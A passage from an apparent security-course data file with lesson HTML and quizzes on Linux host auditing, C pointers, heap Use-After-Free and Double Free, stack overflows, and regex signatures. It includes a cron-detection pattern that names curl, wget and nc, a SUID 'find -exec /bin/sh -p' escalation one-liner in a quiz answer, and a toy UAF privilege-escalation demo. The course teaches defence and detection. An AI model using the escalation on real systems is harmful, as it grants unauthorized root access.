Auditing</h2>\n<p>A rigorous Linux audit targets key architectural persistence vectors:</p>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Audit Vector</th>\n      <th>Threat Implication</th>\n      <th>Underlying Linux Inspection Command</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>1. Superuser Accounts</strong></td>\n      <td>Rogue accounts created with UID 0 to grant root equivalence</td>\n      <td><code>awk -F: '($3 == 0) {print $1}' /etc/passwd</code></td>\n    </tr>\n    <tr>\n      <td><strong>2. SUID Executables</strong></td>\n      <td>Binaries like <code>find</code> or <code>vim</code> configured with SUID flags to bypass root boundaries</td>\n      <td><code>find / -perm -4000 -type f 2&gt;/dev/null</code></td>\n    </tr>\n    <tr>\n      <td><strong>3. Listening Services</strong></td>\n      <td>Exposed services listening on 0.0.0.0 (e.g. unauthenticated Redis or reverse shells)</td>\n      <td><code>ss -tulpn</code> or <code>netstat -antp</code></td>\n    </tr>\n    <tr>\n      <td><strong>4. Persistence Crontabs</strong></td>\n      <td>Scheduled tasks configured to download and execute remote payloads</td>\n      <td>Inspecting <code>/var/spool/cron/</code> and <code>/etc/cron*</code></td>\n    </tr>\n    <tr>\n      <td><strong>5. SSH Keys</strong></td>\n      <td>Adversary public keys appended to <code>~/.ssh/authorized_keys</code></td>\n      <td>Auditing authorized_keys modifications</td>\n    </tr>\n    <tr>\n      <td><strong>6. Dynamic Link Hijack</strong></td>\n      <td>User-mode rootkits loading modules via <code>/etc/ld.so.preload</code></td>\n      <td>Validating size and content of preload configurations</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>2. Production Engine: host_security_audit.sh</h2>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Complete Self-Contained Host Security Audit Engine</div>\n  <pre><code class=\"language-bash\">#!/usr/bin/env bash\nset -euo pipefail\n\nRED=\"\\033[31m\"\nGREEN=\"\\033[32m\"\nYELLOW=\"\\033[33m\"\nCYAN=\"\\033[36m\"\nRESET=\"\\033[0m\"\n\nREPORT_FILE=\"/tmp/audit_report_$(date +%Y%m%d_%H%M%S).txt\"\n\nlog_info()    { echo -e \"[${CYAN}INFO${RESET}] $1\"; echo \"[INFO] $1\" &gt;&gt; \"$REPORT_FILE\"; }\nlog_warn()    { echo -e \"[${YELLOW}WARN${RESET}] $1\"; echo \"[WARN] $1\" &gt;&gt; \"$REPORT_FILE\"; }\nlog_danger()  { echo -e \"[${RED}CRITICAL${RESET}] $1\"; echo \"[CRITICAL] $1\" &gt;&gt; \"$REPORT_FILE\"; }\nlog_success() { echo -e \"[${GREEN}PASS${RESET}] $1\"; echo \"[PASS] $1\" &gt;&gt; \"$REPORT_FILE\"; }\n\necho \"=== Linux Host Security Baseline Inspection ===\" | tee \"$REPORT_FILE\"\necho \"Timestamp: $(date)\" | tee -a \"$REPORT_FILE\"\necho \"Hostname : $(hostname)\" | tee -a \"$REPORT_FILE\"\necho \"------------------------------------------------\" | tee -a \"$REPORT_FILE\"\n\n# 1. Audit Rogue UID 0 Accounts\nlog_info \"1. Auditing superuser accounts (UID 0)...\"\nZERO_UID_USERS=$(awk -F: '($3 == 0) {print $1}' /etc/passwd | tr '\\n' ' ')\nif [[ \"$ZERO_UID_USERS\" == \"root \" ]]; then\n    log_success \"Privilege baseline confirmed: root is the sole UID 0 account.\"\nelse\n    log_danger \"Rogue UID 0 accounts identified: ${ZERO_UID_USERS}\"\nfi\n\n# 2. Audit Dangerous SUID Binaries\nlog_info \"2. Inspecting high-risk SUID executables...\"\nDANGEROUS_SUID_BINS=(\"find\" \"vim\" \"nano\" \"cp\" \"bash\" \"sh\" \"python\" \"perl\")\nFOUND_SUID=0\nfor bin in \"${DANGEROUS_SUID_BINS[@]}\"; do\n    matched_paths=$(find /bin /usr/bin /sbin /usr/sbin -name \"$bin\" -perm -4000 2&gt;/dev/null || true)\n    if [[ -n \"$matched_paths\" ]]; then\n        log_danger \"Dangerous SUID executable detected: $matched_paths\"\n        FOUND_SUID=1\n    fi\ndone\n[[ $FOUND_SUID -eq 0 ]] && log_success \"No dangerous SUID escalation binaries identified.\"\n\n# 3. Audit Network Listening Interfaces\nlog_info \"3. Auditing listening network sockets...\"\nif command -v ss &gt;/dev/null 2&gt;&amp;1; then\n    LISTEN_PORTS=$(ss -tulpn | grep LISTEN || true)\nelse\n    LISTEN_PORTS=$(netstat -tuln | grep LISTEN || true)\nfi\n\necho \"$LISTEN_PORTS\" &gt;&gt; \"$REPORT_FILE\"\nif echo \"$LISTEN_PORTS\" | grep -q \":23\\b\"; then log_danger \"Unencrypted Telnet daemon (port 23) is actively listening!\"; fi\nif echo \"$LISTEN_PORTS\" | grep -q \":6379\\b\"; then log_warn \"Redis daemon (port 6379) listening; verify password protections.\"; fi\n\n# 4. Audit Scheduled Crontabs\nlog_info \"4. Inspecting crontabs for outbound exfiltration...\"\nCRON_ENTRIES=$(cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2&gt;/dev/null | grep -v \"^#\" | grep -v \"^$\" || true)\nif echo \"$CRON_ENTRIES\" | grep -Eq \"(curl|wget|bash|sh|nc|python).*(\\||\\;)\"; then\n    log_danger \"Suspicious scheduled tasks detected executing shell pipelines:\"\n    echo \"$CRON_ENTRIES\" | grep -E \"(curl|wget|bash|sh|nc|python)\" | tee -a \"$REPORT_FILE\"\nelse\n    log_success \"Scheduled tasks clean; no anomalous download strings discovered.\"\nfi\n\n# 5. Audit Dynamic Linker Hijacking\nlog_info \"5. Verifying /etc/ld.so.preload status...\"\nif [[ -f \"/etc/ld.so.preload\" && -s \"/etc/ld.so.preload\" ]]; then\n    log_danger \"/etc/ld.so.preload is non-empty! Possible user-mode rootkit active:\"\n    cat /etc/ld.so.preload | tee -a \"$REPORT_FILE\"\nelse\n    log_success \"/etc/ld.so.preload is clean; no dynamic library hooks configured.\"\nfi\n\necho \"------------------------------------------------\" | tee -a \"$REPORT_FILE\"\nlog_info \"Audit complete! Full telemetry committed to: $REPORT_FILE\"</code></pre>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Six Core Vectors</strong>: Superuser accounts, dangerous SUIDs, open ports, crontab persistence, library preloading, and SSH credentials.</li>\n    <li><strong>Dual Telemetry Architecture</strong>: Emit real-time ANSI terminal alerts while writing structured records to file descriptors via <code>tee -a</code>.</li>\n    <li><strong>Tool Portability</strong>: Validate utility availability via <code>command -v &lt;tool&gt;</code> to maintain cross-distribution compatibility.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Baseline Scripts</div>\n  <p><strong>Exercise 1:</strong> Why is redirecting stderr to <code>2&gt;/dev/null</code> essential when executing <code>find / -perm -4000</code> under unprivileged user permissions?</p>\n  <p><strong>Exercise 2:</strong> Implement a Bash snippet that inspects <code>/etc/login.defs</code>, extracts the value of <code>PASS_MAX_DAYS</code>, and raises an alert if it exceeds 90 days.</p>\n</div>\n","checkpoints":[{"question":"During Linux security auditing, why is discovering non-root accounts with UID 0 in `/etc/passwd` critical?","options":["UID 0 accounts are most vulnerable to rainbow table attacks","The Linux kernel determines root administrative equivalence exclusively via UID 0, regardless of account username","UID 0 accounts cannot initiate outbound network sockets","UID 0 accounts cannot execute shell scripts"],"answer":1,"explanation":"Linux privileges are governed by numeric UID, not username. Any account assigned UID 0 in /etc/passwd possesses complete superuser root permissions."},{"question":"If `/usr/bin/find` has the SUID permission bit configured (-rwsr-xr-x), how can an unprivileged user escalate to root?","options":["find automatically overwrites /etc/sudoers","The user can execute `find . -exec /bin/sh -p \\;`, launching an interactive shell inheriting root SUID privileges","find forcibly disables SELinux kernel protections","find automatically cracks local SSH private keys"],"answer":1,"explanation":"SUID binaries execute with the permissions of the file owner (root). Programs with execution wrappers like find permit spawning interactive shells running under root authority."}]},
  "prog-04-01": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">C Systems Internals</div>\n  <h1>C Memory Layout: Stack, Heap, Global Data & Pointer Arithmetic</h1>\n  <p class=\"lead\">High-level languages (Python, Java, Go) abstract physical RAM behind automatic garbage collectors and object runtimes, whereas C exposes the raw memory structures directly. In binary exploitation (Pwn), reverse engineering, and kernel-level rootkits, vulnerabilities reside squarely inside virtual address spaces. This section deconstructs process memory topology, pointer fundamentals, and pointer arithmetic mechanics.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Deconstruct process virtual memory segments: Text, Data, BSS, Heap, and Stack.</li>\n    <li>Establish a concrete mental model of pointers as raw physical memory addresses.</li>\n    <li>Master <strong>Pointer Arithmetic</strong>: understand why <code>int* + 1</code> advances by 4 bytes rather than 1.</li>\n    <li>Understand multi-tier pointers and function pointers for control flow hijacking.</li>\n  </ul>\n</div>\n\n<h2>1. Process Virtual Memory Architecture</h2>\n<p>In 32-bit and 64-bit operating systems, each process executes inside an isolated virtual address space. From lower to higher memory addresses:</p>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Memory Segment</th>\n      <th>Growth / Permissions</th>\n      <th>Allocated Contents</th>\n      <th>Security Implications</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Text (.text)</strong></td>\n      <td>Fixed / Read + Execute (R-X)</td>\n      <td>Compiled assembly CPU instructions</td>\n      <td>Target for harvesting ROP Gadgets to bypass DEP.</td>\n    </tr>\n    <tr>\n      <td><strong>Initialized Data (.data)</strong></td>\n      <td>Fixed / Read + Write (RW-)</td>\n      <td>Global and static variables initialized explicitly</td>\n      <td>Subject to global variable overwrites.</td>\n    </tr>\n    <tr>\n      <td><strong>Uninitialized Data (.bss)</strong></td>\n      <td>Fixed / Read + Write (RW-)</td>\n      <td>Uninitialized global variables (zero-filled by OS)</td>\n      <td>Heap spray landing pads or information leaks.</td>\n    </tr>\n    <tr>\n      <td><strong>Heap</strong></td>\n      <td><strong>Grows upward</strong> / Read + Write (RW-)</td>\n      <td>Dynamically allocated memory via <code>malloc()</code></td>\n      <td>Vector for Use-After-Free and Double Free exploits.</td>\n    </tr>\n    <tr>\n      <td><strong>Stack</strong></td>\n      <td><strong>Grows downward</strong> / Read + Write (RW-)</td>\n      <td>Local variables, parameters, return addresses (Saved RIP)</td>\n      <td><strong>Stack Buffer Overflows</strong> overwriting return pointers.</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>2. Pointer Fundamentals: Addresses and Dereferencing</h2>\n<p>Memory is an array of byte addresses. A <strong>pointer is simply a variable that stores another variable's memory address</strong>:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Pointer Dereference and Address Inspection</div>\n  <pre><code class=\"language-c\">#include &lt;stdio.h&gt;\n\nint main() {\n    int target_val = 1337;\n    int *ptr = &amp;target_val;  // ptr holds the memory address of target_val\n\n    printf(\"target_val value   : %d\\n\", target_val);\n    printf(\"target_val address : %p\\n\", &amp;target_val);\n    printf(\"ptr stored address : %p\\n\", ptr);\n    printf(\"dereferencing *ptr : %d\\n\", *ptr);\n\n    // Direct memory modification via pointer\n    *ptr = 6666;\n    printf(\"modified value     : %d\\n\", target_val);\n    return 0;\n}</code></pre>\n</div>\n\n<h2>3. Pointer Arithmetic & Type Strides</h2>\n<p>Executing <code>ptr + 1</code> advances the address not by 1 byte, but by <strong><code>sizeof(*ptr)</code></strong> bytes:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Pointer Stride Verification in C</div>\n  <pre><code class=\"language-c\">#include &lt;stdio.h&gt;\n\nint main() {\n    int arr[3] = {100, 200, 300};\n    int *p_int = arr;\n\n    char str[3] = {'A', 'B', 'C'};\n    char *p_char = str;\n\n    printf(\"int*  base: %p, p_int + 1:  %p (delta %zu bytes)\\n\", \n           p_int, p_int + 1, sizeof(int));   // +4 bytes\n    printf(\"char* base: %p, p_char + 1: %p (delta %zu bytes)\\n\", \n           p_char, p_char + 1, sizeof(char)); // +1 byte\n\n    printf(\"arr[1] dereferenced: %d\\n\", *(p_int + 1));\n    return 0;\n}</code></pre>\n</div>\n\n<div class=\"callout callout-warning\">\n  <div class=\"callout-title\">⚠️ Common Pitfall: Wild and Dangling Pointers</div>\n  <p>Declaring a pointer without initialization (<code>int *p;</code>) leaves it pointing to indeterminate stack garbage—a <strong>Wild Pointer</strong>. Attempting <code>*p = 10;</code> triggers segmentation faults or corrupts arbitrary memory. Always initialize pointers explicitly to <code>NULL</code>.</p>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Memory Segments</strong>: Text (R-X), Data/BSS, upward-growing Heap, and downward-growing Stack.</li>\n    <li><strong>Pointer Syntax</strong>: <code>&amp;</code> extracts the memory address; <code>*</code> dereferences the pointer to read or overwrite the target value.</li>\n    <li><strong>Stride Mechanics</strong>: Address increment equals $N \times \text{sizeof}(*ptr)$ bytes.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Memory Addresses</div>\n  <p><strong>Exercise 1:</strong> On a 64-bit Linux architecture, given an array <code>long numbers[5];</code> and pointer <code>long *p = numbers;</code> at address <code>0x7fffffffe000</code>, calculate the physical hexadecimal address of <code>p + 3</code> (recall <code>sizeof(long) == 8</code>).</p>\n  <p><strong>Exercise 2:</strong> Why does <code>malloc()</code> return a generic <code>void*</code> pointer? What considerations apply when assigning it to typed pointers?</p>\n</div>\n","checkpoints":[{"question":"In a 64-bit Linux process virtual address space, what is the relative layout and growth direction of the Stack and Heap?","options":["The Stack resides at high addresses and grows downward; the Heap resides at lower addresses and grows upward; Text resides at low addresses with R-X permissions","The Heap resides at the highest addresses and grows downward; the Stack resides at the lowest addresses and grows upward","The Stack and Heap share an identical fixed memory boundary","The Text segment resides directly below the Stack with writable permissions"],"answer":0,"explanation":"Process memory maps Text at low addresses, followed by Data/BSS, followed by the upward-growing Heap. The Stack is allocated near high addresses and grows downward."},{"question":"Given `int *p = (int *)0x1000;` on a system where `sizeof(int) == 4`, what is the resulting memory address of `p + 2`?","options":["0x1002","0x1008","0x1004","0x1016"],"answer":1,"explanation":"Pointer arithmetic advances addresses by `N * sizeof(*p)`. For integer pointers, `p + 2` evaluates to 0x1000 + 2 * 4 = 0x1008."}]},
  "prog-04-02": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Heap Exploitation</div>\n  <h1>Dynamic Memory Management: malloc/free, UAF & Double Free Vulnerabilities</h1>\n  <p class=\"lead\">Stack allocations are managed automatically by compiler frames, but heap memory lifecycles are entirely dependent on manual developer operations. In C/C++, dynamic allocations form the core engine of systems software—and the most frequent origin of critical remote code execution vulnerabilities. This section deconstructs heap bin allocations, Use-After-Free (UAF), and Double Free exploits.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Understand how heap managers (glibc ptmalloc) reuse cached Chunks via Bins and Tcaches.</li>\n    <li>Analyze how <strong>Dangling Pointers</strong> enable <strong>Use-After-Free (UAF)</strong> privilege escalations.</li>\n    <li>Understand how <strong>Double Free</strong> corrupts memory free-lists to induce arbitrary writes.</li>\n    <li>Implement defensive patterns: Zero-After-Free hygiene and secure memory abstractions.</li>\n  </ul>\n</div>\n\n<h2>1. The Mechanics of Heap Allocation & Reuse</h2>\n<p>Heap allocators do not execute kernel system calls (<code>brk</code>/<code>mmap</code>) on every tiny request. Instead, they manage memory pools:</p>\n<ul>\n  <li><strong>malloc(size)</strong>: Inspects segregated free lists (e.g. tcache bins). If a chunk matches the size, it is returned immediately without context switching.</li>\n  <li><strong>free(ptr)</strong>: <strong>Does not return physical memory to the OS</strong>. Instead, it marks the chunk as available and inserts it into a singly or doubly linked free-list for future reuse.</li>\n</ul>\n\n<h2>2. Use-After-Free (UAF) Vulnerability Mechanics</h2>\n<p>When heap memory is freed but the referring pointer is <strong>not set to NULL</strong>, it becomes a dangling pointer. If an attacker triggers a subsequent allocation of identical size, the heap manager reallocates that same chunk. Calling functions through the dangling pointer executes adversary-controlled data:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Use-After-Free Vulnerability Pattern</div>\n  <pre><code class=\"language-c\">#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct AuthSession {\n    char username[32];\n    int is_admin; // 1 = admin, 0 = standard\n} AuthSession;\n\nint main() {\n    // Step 1: Normal session allocated\n    AuthSession *user_session = (AuthSession *)malloc(sizeof(AuthSession));\n    strcpy(user_session-&gt;username, \"alice\");\n    user_session-&gt;is_admin = 0;\n\n    // Step 2: Session freed; pointer is NOT set to NULL\n    free(user_session);\n\n    // Step 3: Attacker allocates identical size chunk, overwriting memory\n    char *fake_data = (char *)malloc(sizeof(AuthSession));\n    memset(fake_data, 'A', 32);\n    *((int *)(fake_data + 32)) = 1; // Overwrite is_admin offset to 1\n\n    // Step 4: UAF Triggered: inspecting session through stale pointer\n    if (user_session-&gt;is_admin == 1) {\n        printf(\"[+] [EXPLOIT SUCCESS] Escalated to Admin via UAF!\\n\");\n    }\n    return 0;\n}</code></pre>\n</div>\n\n<h2>3. Double Free Corruption & Safe Deallocation</h2>\n<p>Invoking <code>free()</code> twice on the same pointer corrupts the allocator's internal free-list:</p>\n<ol>\n  <li><code>free(p)</code>: Adds <code>p</code> to the head of the free-list: <code>Head -&gt; p -&gt; Next</code>.</li>\n  <li><code>free(p)</code> again: Creates a circular reference: <code>p-&gt;next = p</code>.</li>\n  <li>Subsequent allocations yield overlapping pointers, enabling arbitrary memory writes.</li>\n</ol>\n\n<div class=\"callout callout-warning\">\n  <div class=\"callout-title\">⚠️ Defensive Engineering Rule: Zero-After-Free</div>\n  <pre><code class=\"language-c\">// ❌ UNSAFE: Leaves dangling pointer\nfree(ptr);\n\n// ✅ SAFE: Secure macro ensuring pointer nullification\n#define SAFE_FREE(p) do { if ((p) != NULL) { free(p); (p) = NULL; } } while(0)\n\nSAFE_FREE(ptr); // Repeated calls safely operate on NULL</code></pre>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Heap Chunk Reuse</strong>: <code>free()</code> recycles memory into bins to accelerate subsequent <code>malloc()</code> requests.</li>\n    <li><strong>UAF Killchain</strong>: Allocation $\to$ Deallocation without nullification $\to$ Reallocation overwrite $\to$ Stale dereference.</li>\n    <li><strong>Defensive Standard</strong>: Always set pointers to <code>NULL</code> immediately following <code>free()</code> calls.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Memory Safety</div>\n  <p><strong>Exercise 1:</strong> How do modern languages like Rust mathematically eliminate UAF and Double Free vulnerabilities at compile time through ownership and borrow checking?</p>\n  <p><strong>Exercise 2:</strong> What occurs if an application repeatedly allocates heap buffers via <code>malloc()</code> without invoking <code>free()</code>? What system mitigation eventually triggers?</p>\n</div>\n","checkpoints":[{"question":"What is a 'dangling pointer', and how does it facilitate Use-After-Free (UAF) exploitation?","options":["A pointer referencing physically corrupted RAM hardware","A pointer that retains a memory address after that buffer has been deallocated via `free()`; subsequent allocations can overwrite the memory while the stale pointer still reads/executes it","A pointer causing infinite loop execution","A local pointer exceeding stack frame bounds"],"answer":1,"explanation":"When memory is freed without zeroing the pointer, it becomes dangling. If an attacker reallocates that memory with controlled data, invoking function pointers via the stale pointer hijacks execution."},{"question":"What straightforward coding rule permanently prevents both Use-After-Free and Double Free vulnerabilities?","options":["Allocating over 1GB per heap request","Immediately setting `p = NULL;` following every `free(p)` call, or wrapping deallocation inside safe macros","Eliminating dynamic heap allocation in favor of global variables","Compiling binaries with -O3 optimization flags"],"answer":1,"explanation":"Nullifying pointers immediately following deallocation ensures subsequent free(NULL) calls execute as benign no-ops and subsequent dereferences fail safely rather than executing attacker payloads."}]},
  "prog-04-03": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Memory Corruptions</div>\n  <h1>Stack Buffer Overflows & Unsafe C String Functions</h1>\n  <p class=\"lead\">In 1988, the Morris Worm exploited a buffer overflow in fingerd's gets call, shutting down 10% of the early Internet and inaugurating the modern cybersecurity era. Decades later, from IoT firmware to kernel drivers, stack buffer overflows remain among the most dangerous 0-day primitives. This section explores stack frame layout, return address overwriting, and defensive replacements.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Trace the activation and destruction of function Stack Frames (RBP and Saved RIP).</li>\n    <li>Understand how unconstrained inputs breach local buffers to achieve <strong>Control Flow Hijacking</strong>.</li>\n    <li>Identify dangerous legacy C functions (<code>gets</code>, <code>strcpy</code>, <code>strcat</code>, <code>sprintf</code>) and their bounded counterparts.</li>\n    <li>Analyze modern mitigations: <strong>Stack Canaries</strong>, <strong>NX/DEP</strong>, and <strong>ASLR</strong>.</li>\n  </ul>\n</div>\n\n<h2>1. The Function Call Stack Frame Architecture</h2>\n<p>Invoking a function creates a stack frame growing downward toward lower addresses:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">64-Bit Call Stack Frame Architecture</div>\n  <pre><code class=\"language-plaintext\">[ Higher Addresses ]\n   +---------------------------------------+\n   | Function Arguments                    |\n   +---------------------------------------+\n   | Return Address (Saved RIP)            | <-- Hijack target for ret redirection\n   +---------------------------------------+\n   | Caller Base Pointer (Saved RBP)       |\n   +---------------------------------------+\n   | Stack Canary / Cookie (Random Secret) | <-- Overwrite detection boundary\n   +---------------------------------------+\n   | Local Buffer (char buffer[64])        | <-- Data writes grow upward toward RIP\n[ Lower Addresses (Stack Pointer RSP) ]</code></pre>\n</div>\n\n<h2>2. Control Flow Hijacking Mechanics</h2>\n<p>Copying 128 bytes into a 64-byte stack buffer via <code>strcpy()</code> overwrites adjacent stack contents:</p>\n<ol>\n  <li>Overwrites local variables and Canary;</li>\n  <li>Overwrites Saved RBP;</li>\n  <li><strong>Overwrites the Saved Return Address (RIP)</strong>;</li>\n  <li>When the function executes <code>ret</code>, the CPU loads the overwritten address, diverting control flow to attacker shellcode.</li>\n</ol>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Vulnerable vs Bounded String Operations</div>\n  <pre><code class=\"language-c\">#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid vulnerable_function(char *input) {\n    char local_buf[32];\n    \n    // ❌ DANGEROUS: Unbounded copy induces stack overflow\n    // strcpy(local_buf, input);\n    \n    // ✅ SECURE: Bounded copy with explicit null termination\n    strncpy(local_buf, input, sizeof(local_buf) - 1);\n    local_buf[sizeof(local_buf) - 1] = '\\0';\n}</code></pre>\n</div>\n\n<h2>3. Dangerous Function Blacklist & Secure Equivalents</h2>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Dangerous API</th>\n      <th>Vulnerability Mechanism</th>\n      <th>Secure Replacement</th>\n      <th>Implementation Rule</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>gets(buf)</code></td>\n      <td><strong>Banned in C11</strong>; lacks length limits completely.</td>\n      <td><code>fgets(buf, size, stdin)</code></td>\n      <td>Never allow <code>gets</code> under any circumstances.</td>\n    </tr>\n    <tr>\n      <td><code>strcpy(dst, src)</code></td>\n      <td>Copies until reaching <code>\\0</code>, ignoring destination capacity.</td>\n      <td><code>strncpy(dst, src, n)</code></td>\n      <td>Pass destination size and append explicit <code>\\0</code>.</td>\n    </tr>\n    <tr>\n      <td><code>strcat(dst, src)</code></td>\n      <td>Appends strings without verifying aggregated buffer bounds.</td>\n      <td><code>strncat(dst, src, n)</code></td>\n      <td>Calculate remaining space: <code>sizeof(dst) - strlen(dst) - 1</code>.</td>\n    </tr>\n    <tr>\n      <td><code>sprintf(buf, ...)</code></td>\n      <td>Formats strings into destination without capacity bounds.</td>\n      <td><code>snprintf(buf, size, ...)</code></td>\n      <td>Enforce <code>size</code> parameter matching destination buffer.</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>4. Modern Triad of Exploit Mitigations</h2>\n<p>Modern compilers and operating systems deploy three layers of defensive mitigations:</p>\n<ul>\n  <li><strong>Stack Canaries</strong>: Injects a randomized secret between buffers and the return address, checking integrity before <code>ret</code>.</li>\n  <li><strong>NX / DEP (No-Execute)</strong>: Marks stack and heap pages as non-executable, preventing injected shellcode execution.</li>\n  <li><strong>ASLR (Address Space Layout Randomization)</strong>: Randomizes base addresses of stack, heap, and libraries upon execution.</li>\n</ul>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Stack Vulnerability</strong>: Upward-growing buffer writes breach downward-growing stack frames, corrupting Saved RIP pointers.</li>\n    <li><strong>API Replacement</strong>: Replace unbounded functions (<code>gets/strcpy/sprintf</code>) with bounded alternatives (<code>fgets/strncpy/snprintf</code>).</li>\n    <li><strong>Mitigation Triad</strong>: Canary (tamper detection), NX/DEP (memory execution prevention), and ASLR (randomization).</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Overflow Mitigations</div>\n  <p><strong>Exercise 1:</strong> Why can adversaries still execute code via Return-Oriented Programming (ROP) even when NX/DEP is enabled?</p>\n  <p><strong>Exercise 2:</strong> Author a safe <code>snprintf</code> statement formatting integer <code>uid=1001</code> and string <code>role=\"auditor\"</code> into <code>char log_buf[64]</code> without overflow.</p>\n</div>\n","checkpoints":[{"question":"What is the physical mechanism by which a classic stack buffer overflow achieves control flow hijacking?","options":["Local stack buffers fill upward toward higher addresses; unbounded inputs overflow the buffer boundary and overwrite the Saved Return Address (RIP) on the stack frame","Overwriting memory causes CPU cooling fans to halt","Data overflows overwrite motherboard BIOS firmware directly","C compilers automatically spawn root shells upon buffer boundary violations"],"answer":0,"explanation":"Stack buffers fill from lower to higher memory addresses. Unbounded writes breach the buffer boundary, overwriting local variables, Saved RBP, and the Saved Return Address (RIP) loaded by `ret`."},{"question":"Why was the legacy input function `gets()` completely purged from the C11 language standard?","options":["gets() only supports ASCII and fails on UTF-8 strings","gets() lacks any buffer capacity parameter, reading until a newline is encountered and rendering it mathematically impossible to prevent overflows","gets() executes 10 times slower than fgets()","gets() requires commercial licensing fees"],"answer":1,"explanation":"gets() takes only a destination pointer without any length parameter, making it fundamentally impossible to validate input length against buffer capacity."}]},
  "prog-05-01": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Pattern Matching</div>\n  <h1>Regex Metacharacters, Group Captures & Security Signatures</h1>\n  <p class=\"lead\">Across Intrusion Detection Systems (IDS), Web Application Firewalls (WAF), and Data Loss Prevention (DLP) engines, Regular Expressions (Regex) define the common syntax of attack indicators. Literal substring checks only match fixed values, whereas regex captures polymorphic variants. This section deconstructs metacharacters, greedy vs non-greedy evaluation, capture groups, and production security signatures.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Master metacharacters, shorthand classes (<code>\\d</code>, <code>\\w</code>, <code>\\s</code>, <code>\\b</code>), and anchors (<code>^</code>, <code>$</code>).</li>\n    <li>Understand <strong>Greedy vs Lazy Evaluation</strong> to prevent accidental multi-line payload truncation.</li>\n    <li>Deploy capture groups, non-capturing groups <code>(?:...)</code>, and named groups <code>(?P&lt;name&gt;...)</code>.</li>\n    <li>Author production signatures for SQLi, XSS, and AWS/JWT secret discovery.</li>\n  </ul>\n</div>\n\n<h2>1. Metacharacters, Shorthand Classes & Boundaries</h2>\n<p>Constructing threat signatures requires understanding metacharacter evaluation:</p>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Category</th>\n      <th>Metacharacters</th>\n      <th>Evaluation Behavior</th>\n      <th>Security Application</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Shorthand Classes</strong></td>\n      <td><code>\\d</code>, <code>\\w</code>, <code>\\s</code></td>\n      <td>Digits <code>[0-9]</code>; Alphanumeric <code>[a-zA-Z0-9_]</code>; Whitespace.</td>\n      <td>Validating tokens, SessionIDs, and hash patterns.</td>\n    </tr>\n    <tr>\n      <td><strong>Boundary Anchors</strong></td>\n      <td><code>^</code>, <code>$</code>, <code>\\b</code></td>\n      <td>Start of line; End of line; Word boundary.</td>\n      <td><code>\\badmin\\b</code> suppresses false positives on <code>administrator</code>.</td>\n    </tr>\n    <tr>\n      <td><strong>Quantifiers</strong></td>\n      <td><code>*</code>, <code>+</code>, <code>?</code>, <code>{m,n}</code></td>\n      <td>0 or more; 1 or more; 0 or 1; bounded ranges.</td>\n      <td>Enforcing minimum password length or IPv4 octet bounds.</td>\n    </tr>\n    <tr>\n      <td><strong>Greedy vs Lazy</strong></td>\n      <td><code>.*?</code>, <code>.+?</code></td>\n      <td>Greedy consumes maximal characters; <code>?</code> forces minimal lazy matches.</td>\n      <td>Extracting <code>&lt;script.*?&gt;</code> without consuming intervening code.</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>2. Capturing Groups & Structured Python Ingestion</h2>\n<p>Grouping enables targeted extraction of telemetry subfields:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Python Regex Grouping and Precompilation</div>\n  <pre><code class=\"language-python\">import re\n\n# 1. Precompile regex pattern for optimal loop performance\nip_pattern = re.compile(r\"\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b\")\n\nlog_sample = 